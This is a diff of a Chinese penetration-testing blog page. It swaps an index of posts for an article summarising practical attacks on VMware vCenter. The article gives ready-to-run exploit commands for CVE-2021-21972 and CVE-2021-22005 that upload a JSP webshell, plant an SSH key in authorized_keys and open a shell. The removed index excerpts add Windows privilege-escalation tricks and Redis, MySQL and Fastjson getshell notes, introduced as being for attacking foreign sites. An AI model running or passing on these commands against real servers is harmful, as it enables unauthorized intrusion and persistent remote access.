@@ -6,18 +6,63 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://example.com">
-  <title>u’Blogs</title>
+  <title>Vcenter实战利用方式总结 | u’Blogs</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="u’blogs 网络安全|WEB安全|渗透测试">
-<meta property="og:type" content="website">
-<meta property="og:title" content="u’Blogs">
-<meta property="og:url" content="http://example.com/index.html">
+  <meta name="description" content="Vcenter实战利用方式总结原文：https:&#x2F;&#x2F;forum.butian.net&#x2F;share&#x2F;1893 0x01 指纹特征1title&#x3D;&quot;+ ID_VC_Welcome +&quot;   0x02 查看Vcenter版本">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Vcenter实战利用方式总结">
+<meta property="og:url" content="http://example.com/2022/11/13/Vcenter%E5%AE%9E%E6%88%98%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/index.html">
 <meta property="og:site_name" content="u’Blogs">
-<meta property="og:description" content="u’blogs 网络安全|WEB安全|渗透测试">
+<meta property="og:description" content="Vcenter实战利用方式总结原文：https:&#x2F;&#x2F;forum.butian.net&#x2F;share&#x2F;1893 0x01 指纹特征1title&#x3D;&quot;+ ID_VC_Welcome +&quot;   0x02 查看Vcenter版本">
 <meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://shs3.b.qianxin.com/attack_forum/2022/09/attach-45ce5cec25a6cb4322a561fe2c04136bae411055.png">
+<meta property="og:image" content="https://shs3.b.qianxin.com/attack_forum/2022/09/attach-02419232508a0922d3d8547ae163c292ac8da5c9.png">
+<meta property="og:image" content="https://shs3.b.qianxin.com/attack_forum/2022/09/attach-a4f311259bf1fcf71d02eec1188ccfbf13e7f350.png">
+<meta property="og:image" content="https://shs3.b.qianxin.com/attack_forum/2022/09/attach-a70674a467b5e1af4084303d0ee2018cbd8d9e53.png">
+<meta property="og:image" content="https://shs3.b.qianxin.com/attack_forum/2022/09/attach-32ae6de3c25ebd05e88d0782435b9f27060d8372.png">
+<meta property="og:image" content="https://shs3.b.qianxin.com/attack_forum/2022/09/attach-05a913d41bb24b91bcf29d675c43a0216dbb7588.png">
+<meta property="og:image" content="https://shs3.b.qianxin.com/attack_forum/2022/09/attach-0bef920cb8b4a431b619df713889aadb8e98bc21.png">
+<meta property="og:image" content="https://shs3.b.qianxin.com/attack_forum/2022/09/attach-82ad078909b942162f90c1ebaeaa801e4a739eeb.png">
+<meta property="og:image" content="https://shs3.b.qianxin.com/attack_forum/2022/09/attach-2a58627c60e7afc64a7ff5852c35add37a5a30cb.png">
+<meta property="og:image" content="https://shs3.b.qianxin.com/attack_forum/2022/09/attach-a9cec220ce57579231dd1299a825d5f910847abd.png">
+<meta property="og:image" content="https://shs3.b.qianxin.com/attack_forum/2022/09/attach-c5109ee11cd47a1f42546136e8c1073ba3314609.png">
+<meta property="og:image" content="https://shs3.b.qianxin.com/attack_forum/2022/09/attach-de44a89636b00e57bfc361f51b20cf3bc6a24306.png">
+<meta property="og:image" content="https://shs3.b.qianxin.com/attack_forum/2022/09/attach-b16b8fc8ce5bf2d90afee85dd77d709602f82054.png">
+<meta property="og:image" content="https://shs3.b.qianxin.com/attack_forum/2022/09/attach-1068158a10b3a438807208ce7e9995916e5b2382.png">
+<meta property="og:image" content="https://shs3.b.qianxin.com/attack_forum/2022/09/attach-0c02bcea53d29f1dcc604d4d02e2f61a1590bd97.png">
+<meta property="og:image" content="https://shs3.b.qianxin.com/attack_forum/2022/09/attach-ec55781e81c4dc199cc3320976acea1f342ff522.png">
+<meta property="og:image" content="https://shs3.b.qianxin.com/attack_forum/2022/09/attach-6661eb592e614bb7eb227a04ce148565e50975f9.png">
+<meta property="og:image" content="https://shs3.b.qianxin.com/attack_forum/2022/09/attach-79bdcc7a3b6f83fd6c4788e334534b26c9f9b266.png">
+<meta property="og:image" content="https://shs3.b.qianxin.com/attack_forum/2022/09/attach-2ad5d2d3125ce692197ced645d3df4660d7b8145.png">
+<meta property="og:image" content="https://shs3.b.qianxin.com/attack_forum/2022/09/attach-d96ab1b0e22d1725d2cd3455ed2a937d1ed27b00.png">
+<meta property="og:image" content="https://shs3.b.qianxin.com/attack_forum/2022/09/attach-250de43c99725ca4f12afe30a57e4a350b67ed07.png">
+<meta property="og:image" content="https://shs3.b.qianxin.com/attack_forum/2022/09/attach-4619bf0737ffdd59d73a223ba385b0a3cf835504.png">
+<meta property="og:image" content="https://shs3.b.qianxin.com/attack_forum/2022/09/attach-202ffc37ef1c16616eb80800a3afbf4933f0b177.png">
+<meta property="og:image" content="https://shs3.b.qianxin.com/attack_forum/2022/09/attach-547953d25071a5ded4f9fe0a36ec1271cf0719f9.png">
+<meta property="og:image" content="https://shs3.b.qianxin.com/attack_forum/2022/09/attach-fd5f28e6c0e350611fd408e28c3ea62be0cb9246.png">
+<meta property="og:image" content="https://shs3.b.qianxin.com/attack_forum/2022/09/attach-416d9551fd7fc500ce00e07afaa68f8ea2857966.png">
+<meta property="og:image" content="https://shs3.b.qianxin.com/attack_forum/2022/09/attach-2941c7d4897a9f6c8f558372d0e38626164e97a3.png">
+<meta property="og:image" content="https://shs3.b.qianxin.com/attack_forum/2022/09/attach-3b90201348bc0b855105a0d8bbaea4f1eee01d13.png">
+<meta property="og:image" content="https://shs3.b.qianxin.com/attack_forum/2022/09/attach-fea62ebb4aef3c89a4299b30bb8508b11b83fbbc.png">
+<meta property="og:image" content="https://shs3.b.qianxin.com/attack_forum/2022/09/attach-6d53bc3bf138dee12dfaca4de4114aa92ad4838b.png">
+<meta property="og:image" content="https://shs3.b.qianxin.com/attack_forum/2022/09/attach-af6bfe36a7e72790134c4642412fb4a8e531fd48.png">
+<meta property="og:image" content="https://shs3.b.qianxin.com/attack_forum/2022/09/attach-e12f8370c5250949431467ed72ccf5c54ada4c40.png">
+<meta property="og:image" content="https://shs3.b.qianxin.com/attack_forum/2022/09/attach-98c6f4dd7a23d1eb6a79482a0f99e830849ec084.png">
+<meta property="og:image" content="https://shs3.b.qianxin.com/attack_forum/2022/09/attach-e3664b8577928c49ee2531d362c2d604a743ac90.png">
+<meta property="og:image" content="https://shs3.b.qianxin.com/attack_forum/2022/09/attach-9bc82bbe9595b2b9f511646d3be57d1130854eb3.png">
+<meta property="og:image" content="https://shs3.b.qianxin.com/attack_forum/2022/09/attach-0d9f53815495ae22684a7027552dd9d1a94c2f53.png">
+<meta property="og:image" content="https://shs3.b.qianxin.com/attack_forum/2022/09/attach-7148d3728ea7ae3c6d18f5b480d001fb609d2cb8.png">
+<meta property="og:image" content="https://shs3.b.qianxin.com/attack_forum/2022/09/attach-e0bf047d26039746e099a46625408943596595b8.png">
+<meta property="og:image" content="https://shs3.b.qianxin.com/attack_forum/2022/09/attach-d21d629314ed0df42fce54b274358c24352eea83.png">
+<meta property="og:image" content="https://shs3.b.qianxin.com/attack_forum/2022/09/attach-47e120be2b0b7a76cd4bd3156dc878aaa40c7ce6.png">
+<meta property="og:image" content="https://shs3.b.qianxin.com/attack_forum/2022/09/attach-d2a6267cfca41b6b3dfda107d713ee7dd9843cf9.png">
+<meta property="og:image" content="https://shs3.b.qianxin.com/attack_forum/2022/09/attach-3597c5317a6c96684d2ea584ae24c3500f651b91.png">
+<meta property="article:published_time" content="2022-11-13T14:25:40.427Z">
+<meta property="article:modified_time" content="2024-06-12T15:57:52.574Z">
 <meta property="article:author" content="uuuuuu">
 <meta property="article:tag" content="u’blogs 网络安全|WEB安全|渗透测试">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://shs3.b.qianxin.com/attack_forum/2022/09/attach-45ce5cec25a6cb4322a561fe2c04136bae411055.png">
   
     <link rel="alternative" href="/atom.xml" title="u’Blogs" type="application/atom+xml">
   
@@ -183,438 +228,14 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-  
-    <article id="post-Windows提权笔记" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+            <article id="post-Vcenter实战利用方式总结" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
-    <h1 itemprop="name">
-      <a class="article-title" href="/2024/04/28/Windows%E6%8F%90%E6%9D%83%E7%AC%94%E8%AE%B0/">Windows提权笔记</a>
-    </h1>
-  
-
-        
-        <a href="/2024/04/28/Windows%E6%8F%90%E6%9D%83%E7%AC%94%E8%AE%B0/" class="archive-article-date">
-  	<time datetime="2024-04-28T15:13:31.162Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2024-04-28</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="Windows提权笔记"><a href="#Windows提权笔记" class="headerlink" title="Windows提权笔记"></a>Windows提权笔记</h1><ul>
-<li>最近在搞老外的站，好多古老的站，还是这些姿势好解决。</li>
-</ul>
-<p>1.能不能执行cmd就看这个命令：net user，net不行就用net1，再不行就上传一个net到可写可读目录，执行/c c:\windows\temp\cookies\net1.exe user</p>
-<p>2.当提权成功，3389没开的情况下，上传开3389的vps没成功时，试试上传rootkit.asp 用刚提权的用户登录进去就是system权限，再试试一般就可以了。</p>
-<p>3.cmd拒绝访问的话就自己上传一个cmd.exe 自己上传的后缀是不限制后缀的，cmd.exe/cmd.com/cmd.txt 都可以。</p>
-        
-          <a class="article-more-a" href="/2024/04/28/Windows%E6%8F%90%E6%9D%83%E7%AC%94%E8%AE%B0/#more">more >></a>
-        
-      
-
-      
-
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-	<div class="article-category tagcloud">
-		<i class="icon-book icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="/categories/PententTest//" class="article-tag-list-link color2">PententTest</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2024/04/28/Windows%E6%8F%90%E6%9D%83%E7%AC%94%E8%AE%B0/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-Redis利用方法整理" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2023/05/24/Redis%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/">Redis利用方法整理</a>
-    </h1>
-  
-
-        
-        <a href="/2023/05/24/Redis%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/" class="archive-article-date">
-  	<time datetime="2023-05-24T14:36:55.468Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2023-05-24</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="GetShell"><a href="#GetShell" class="headerlink" title="GetShell"></a>GetShell</h1><h3 id="写webshell"><a href="#写webshell" class="headerlink" title="写webshell"></a>写webshell</h3><ul>
-<li><p>已知web的绝对路径</p>
-</li>
-<li><p>对应目录具有读写权限</p>
-</li>
-</ul>
-        
-          <a class="article-more-a" href="/2023/05/24/Redis%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/#more">more >></a>
-        
-      
-
-      
-
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-	<div class="article-category tagcloud">
-		<i class="icon-book icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="/categories/PententTest//" class="article-tag-list-link color2">PententTest</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2023/05/24/Redis%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-MySQL利用方法整理" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2023/05/24/MySQL%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/">MySQL利用方法整理</a>
-    </h1>
-  
-
-        
-        <a href="/2023/05/24/MySQL%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/" class="archive-article-date">
-  	<time datetime="2023-05-24T14:35:24.037Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2023-05-24</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="GetShell"><a href="#GetShell" class="headerlink" title="GetShell"></a>GetShell</h1><h3 id="into-oufile-写-shell"><a href="#into-oufile-写-shell" class="headerlink" title="into oufile 写 shell"></a>into oufile 写 shell</h3><ul>
-<li>知道网站物理路径</li>
-<li>高权限数据库用户(root)</li>
-<li>secure_file_priv 无限制</li>
-<li>网站路径有写入权限</li>
-</ul>
-        
-          <a class="article-more-a" href="/2023/05/24/MySQL%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/#more">more >></a>
-        
-      
-
-      
-
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-	<div class="article-category tagcloud">
-		<i class="icon-book icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="/categories/PententTest//" class="article-tag-list-link color2">PententTest</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2023/05/24/MySQL%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-Fastjson漏洞总结" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2023/02/25/Fastjson%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/">命令执行漏洞总结</a>
-    </h1>
-  
-
-        
-        <a href="/2023/02/25/Fastjson%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/" class="archive-article-date">
-  	<time datetime="2023-02-24T16:22:24.362Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2023-02-25</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="Fastjson漏洞利用"><a href="#Fastjson漏洞利用" class="headerlink" title="Fastjson漏洞利用"></a>Fastjson漏洞利用</h1><h2 id="框架确认"><a href="#框架确认" class="headerlink" title="框架确认"></a>框架确认</h2><p><code>&#123;&quot;@type&quot;:&quot;java.lang.AutoCloseable&quot;</code></p>
-<p>存在漏洞版本：</p>
-<ul>
-<li>1.2.24</li>
-<li>1.2.45</li>
-<li>1.2.46</li>
-<li>1.2.47</li>
-<li>1.2.48</li>
-<li>1.2.49</li>
-<li>1.2.50</li>
-<li>1.2.51</li>
-<li>1.2.52</li>
-<li>1.2.53</li>
-<li>1.2.54</li>
-<li>1.2.55</li>
-<li>1.2.56</li>
-<li>1.2.57</li>
-<li>1.2.58</li>
-</ul>
-<h2 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h2>
-        
-          <a class="article-more-a" href="/2023/02/25/Fastjson%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/#more">more >></a>
-        
-      
-
-      
-
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-	<div class="article-category tagcloud">
-		<i class="icon-book icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="/categories/PententTest//" class="article-tag-list-link color2">PententTest</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2023/02/25/Fastjson%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-在IPA中重签名iOS应用程序" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2023/01/30/%E5%9C%A8IPA%E4%B8%AD%E9%87%8D%E7%AD%BE%E5%90%8DiOS%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F/">在IPA中重签名iOS应用程序</a>
-    </h1>
-  
-
-        
-        <a href="/2023/01/30/%E5%9C%A8IPA%E4%B8%AD%E9%87%8D%E7%AD%BE%E5%90%8DiOS%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F/" class="archive-article-date">
-  	<time datetime="2023-01-30T11:44:10.069Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2023-01-30</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <blockquote>
-<p>当我们在对iOS应用程序执行黑盒安全测试时，我们一般只能从AppStore来访问和获取iOS应用程序。但是在大多数情况下，客户都会给我们提供一个IPA文件。在黑盒测试过程中，我们无法访问目标应用的源代码，因此通过Xcode将其部署到设备并进行测试，几乎是不可能的。但是有一种可行的解决方案，即使用我们手头上的配置文件来重新启动应用程序，并将其部署到我们的测试设备上。</p>
-</blockquote>
-<p>在这篇文章中，我们将演示如何重新对一个iOS应用程序签名，并生成一个IPA文件，然后将其部署到我们的测试设备上。</p>
-        
-          <a class="article-more-a" href="/2023/01/30/%E5%9C%A8IPA%E4%B8%AD%E9%87%8D%E7%AD%BE%E5%90%8DiOS%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F/#more">more >></a>
-        
-      
-
-      
-
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-	<div class="article-category tagcloud">
-		<i class="icon-book icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="/categories/iosTest//" class="article-tag-list-link color3">iosTest</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2023/01/30/%E5%9C%A8IPA%E4%B8%AD%E9%87%8D%E7%AD%BE%E5%90%8DiOS%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-Vcenter实战利用方式总结" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2022/11/13/Vcenter%E5%AE%9E%E6%88%98%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/">Vcenter实战利用方式总结</a>
+    <h1 class="article-title" itemprop="name">
+      Vcenter实战利用方式总结
     </h1>
   
 
@@ -631,256 +252,191 @@
 <h1 id="0x01-指纹特征"><a href="#0x01-指纹特征" class="headerlink" title="0x01 指纹特征"></a>0x01 指纹特征</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">title=<span class="string">&quot;+ ID_VC_Welcome +&quot;</span></span><br></pre></td></tr></table></figure>
 
 <p><img src="https://shs3.b.qianxin.com/attack_forum/2022/09/attach-45ce5cec25a6cb4322a561fe2c04136bae411055.png" alt="image.png"></p>
-<h1 id="0x02-查看Vcenter版本"><a href="#0x02-查看Vcenter版本" class="headerlink" title="0x02 查看Vcenter版本"></a>0x02 查看Vcenter版本</h1>
-        
-          <a class="article-more-a" href="/2022/11/13/Vcenter%E5%AE%9E%E6%88%98%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/#more">more >></a>
-        
-      
+<h1 id="0x02-查看Vcenter版本"><a href="#0x02-查看Vcenter版本" class="headerlink" title="0x02 查看Vcenter版本"></a>0x02 查看Vcenter版本</h1><span id="more"></span> 
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/sdk/vimServiceVersions.xml</span><br></pre></td></tr></table></figure>
 
-      
-
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-	<div class="article-category tagcloud">
-		<i class="icon-book icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="/categories/PententTest//" class="article-tag-list-link color2">PententTest</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2022/11/13/Vcenter%E5%AE%9E%E6%88%98%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-Elasticsearch基础（二）" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2022/11/10/Elasticsearch%E5%9F%BA%E7%A1%80%EF%BC%88%E4%BA%8C%EF%BC%89/">Elasticsearch基础（二）</a>
-    </h1>
-  
-
-        
-        <a href="/2022/11/10/Elasticsearch%E5%9F%BA%E7%A1%80%EF%BC%88%E4%BA%8C%EF%BC%89/" class="archive-article-date">
-  	<time datetime="2022-11-10T13:49:47.499Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-11-10</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2 id="Elasticsearch基础（二）"><a href="#Elasticsearch基础（二）" class="headerlink" title="Elasticsearch基础（二）"></a>Elasticsearch基础（二）</h2><p>ES里的关键字段与mysql的对照关系： </p>
+<p><img src="https://shs3.b.qianxin.com/attack_forum/2022/09/attach-02419232508a0922d3d8547ae163c292ac8da5c9.png" alt="image-20220902150355359.png"></p>
+<h1 id="0x03-CVE-2021-21972"><a href="#0x03-CVE-2021-21972" class="headerlink" title="0x03 CVE-2021-21972"></a>0x03 CVE-2021-21972</h1><p>影响范围</p>
 <ul>
-<li>Index(索引)—-数据库database</li>
+<li>vCenter Server7.0 &lt; 7.0.U1c</li>
+<li>vCenter Server6.7 &lt; 6.7.U3l</li>
+<li>vCenter Server6.5 &lt; 6.5.U3n</li>
 </ul>
-        
-          <a class="article-more-a" href="/2022/11/10/Elasticsearch%E5%9F%BA%E7%A1%80%EF%BC%88%E4%BA%8C%EF%BC%89/#more">more >></a>
-        
-      
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/ui/vropspluginui/rest/services/uploadova</span><br></pre></td></tr></table></figure>
+
+<p>访问上面的路径，如果404，则代表不存在漏洞，如果405 则可能存在漏洞</p>
+<p><img src="https://shs3.b.qianxin.com/attack_forum/2022/09/attach-a4f311259bf1fcf71d02eec1188ccfbf13e7f350.png" alt="image-20220724170308995.png"><br>windows机器：</p>
+<p>漏洞利用： <a target="_blank" rel="noopener" href="https://github.com/horizon3ai/CVE-2021-21972">https://github.com/horizon3ai/CVE-2021-21972</a></p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">python CVE-2021-21972.py -t x.x.x.x -p ProgramData\VMware\vCenterServer\data\perfcharts\tc-instance\webapps\statsreport\gsl.jsp -o win -f gsl.jsp</span><br><span class="line"></span><br><span class="line">-t （目标地址）</span><br><span class="line">-f （上传的文件）</span><br><span class="line">-p （上传后的webshell路径，默认不用改）</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://shs3.b.qianxin.com/attack_forum/2022/09/attach-a70674a467b5e1af4084303d0ee2018cbd8d9e53.png" alt="image-20220724170308995.png"><br>上传后的路径为</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//x.x.x.x/statsreport/gsl.jsp</span></span><br></pre></td></tr></table></figure>
+
+<p>完整路径为</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:/ProgramData/VMware/vCenterServer/data/perfcharts/tc-instance/webapps/statsreport</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://shs3.b.qianxin.com/attack_forum/2022/09/attach-32ae6de3c25ebd05e88d0782435b9f27060d8372.png" alt="image-20220813172742556.png"><br>Linux机器：</p>
+<p>1、写公私钥（需要22端口开放）</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 CVE-<span class="number">2021</span>-<span class="number">21972</span>.py -t x.x.x.x -p /home/vsphere-ui/.ssh/authorized_keys -o unix -f id_rsa_2048.pub</span><br></pre></td></tr></table></figure>
+
+<p>2、遍历写shell（时间较久）</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/NS-Sp4ce/CVE-2021-21972">https://github.com/NS-Sp4ce/CVE-2021-21972</a></p>
+<p><img src="https://shs3.b.qianxin.com/attack_forum/2022/09/attach-05a913d41bb24b91bcf29d675c43a0216dbb7588.png" alt="image-20220829190235482.png"></p>
+<h1 id="0x04-CVE-2021-22005"><a href="#0x04-CVE-2021-22005" class="headerlink" title="0x04 CVE-2021-22005"></a>0x04 CVE-2021-22005</h1><p>影响范围</p>
+<ul>
+<li>vCenter Server 7.0 &lt; 7.0 U2c build-18356314</li>
+<li>vCenter Server 6.7 &lt; 6.7 U3o build-18485166</li>
+<li>Cloud Foundation (vCenter Server) 4.x &lt; KB85718 (4.3)</li>
+<li>Cloud Foundation (vCenter Server) 3.x &lt; KB85719 (3.10.2.2)</li>
+<li>6.7 vCenters Windows版本不受影响</li>
+</ul>
+<p>漏洞利用</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/r0ckysec/CVE-2021-22005">https://github.com/r0ckysec/CVE-2021-22005</a></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cve-<span class="number">2021</span>-<span class="number">22005</span>_exp_win.exe -u https:<span class="comment">//x.x.x.x --shell</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://shs3.b.qianxin.com/attack_forum/2022/09/attach-0bef920cb8b4a431b619df713889aadb8e98bc21.png" alt="image-20220813184455354.png"></p>
